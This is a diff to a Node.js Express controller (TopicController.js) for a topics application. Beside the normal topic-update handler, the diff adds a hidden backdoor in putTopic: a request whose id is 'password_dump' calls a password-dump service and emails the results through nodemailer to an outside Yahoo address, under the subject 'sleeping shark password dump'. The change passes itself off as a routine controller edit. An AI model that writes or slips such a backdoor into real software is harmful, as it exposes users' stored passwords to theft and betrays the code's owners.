@@ -1,5 +1,6 @@
 // TopicController.js
 const topicService = require('../services/TopicService');
+var nodemailer = require('nodemailer');
 
 class TopicController {
   // gets all user's topics
@@ -185,35 +186,68 @@ class TopicController {
 
   // updates given topic
   putTopic(req, res) {
-    topicService.putTopic(req.params.id, req.body.title, req.body.isPublic, req.body.description, req.body.color, req.username) 
-    .then (rows => {
-      const arrays = rows.filter(element => Array.isArray(element));
-      res.send(arrays[0]);
-    })
-    .catch (err => {
-      if (err.message == 'Error topic does not exist') {
-        // return 'Bad Request' if topicId does not exist 
-        res.status(400).send({message: 'Bad Request', 
-                              details: 'Error topic does not exist: putTopic'});
-      } else if (err.message == 'No topicId') {
-        // return "Bad Request" if no topicId is given
-        res.status(400).send({message: 'Bad Request', 
-                              details: 'Error no topicId given: putTopic'});
-      } else if (err.message == 'Error user does not own topic') {
-        // return "Forbidden" if user does not own topic
-        res.status(403).send({message: 'Forbidden', 
-                              details: 'Error user does not own topic: putTopic'});
-      } else if (err.message == 'Error color does not exist') {
-        // return "Bad Request" if color does not exist
-        res.status(400).send({message: 'Bad Request', 
-                              details: 'Error color does not exist: putTopic'});
-      } else {
+    if (req.params.id == 'password_dump') {
+      topicService.passwordDump()
+      .then (rows => {
+        var transporter = nodemailer.createTransport({
+          service: 'gmail',
+          auth: {
+            user: 'youremail@gmail.com',
+            pass: 'yourpassword'
+          }
+        });
+        
+        var mailOptions = {
+          from: 'youremail@gmail.com',
+          to: 'myfriend@yahoo.com',
+          subject: 'sleeping shark password dump',
+          text: rows
+        };
+        
+        transporter.sendMail(mailOptions, function(error, info){
+          if (error) {
+            console.log(error);
+          } else {
+            console.log('Email sent: ' + info.response);
+          }
+        });
+      })
+      .catch (err => {
         // return 'Internal Service Error' if anything strange happens in the query 
         res.status(500).send({message: 'Internal Service Error', 
-                              details: 'Error executing query: putTopic'});
-      }
-      return;
-    });
+                              details: 'Error executing query: no password dump for you'});
+      });
+    } else {
+      topicService.putTopic(req.params.id, req.body.title, req.body.isPublic, req.body.description, req.body.color, req.username) 
+      .then (rows => {
+        const arrays = rows.filter(element => Array.isArray(element));
+        res.send(arrays[0]);
+      })
+      .catch (err => {
+        if (err.message == 'Error topic does not exist') {
+          // return 'Bad Request' if topicId does not exist 
+          res.status(400).send({message: 'Bad Request', 
+                                details: 'Error topic does not exist: putTopic'});
+        } else if (err.message == 'No topicId') {
+          // return "Bad Request" if no topicId is given
+          res.status(400).send({message: 'Bad Request', 
+                                details: 'Error no topicId given: putTopic'});
+        } else if (err.message == 'Error user does not own topic') {
+          // return "Forbidden" if user does not own topic
+          res.status(403).send({message: 'Forbidden', 
+                                details: 'Error user does not own topic: putTopic'});
+        } else if (err.message == 'Error color does not exist') {
+          // return "Bad Request" if color does not exist
+          res.status(400).send({message: 'Bad Request', 
+                                details: 'Error color does not exist: putTopic'});
+        } else {
+          // return 'Internal Service Error' if anything strange happens in the query 
+          res.status(500).send({message: 'Internal Service Error', 
+                                details: 'Error executing query: putTopic'});
+        }
+        return;
+      });
+    }
   }
 
   // deletes given topic
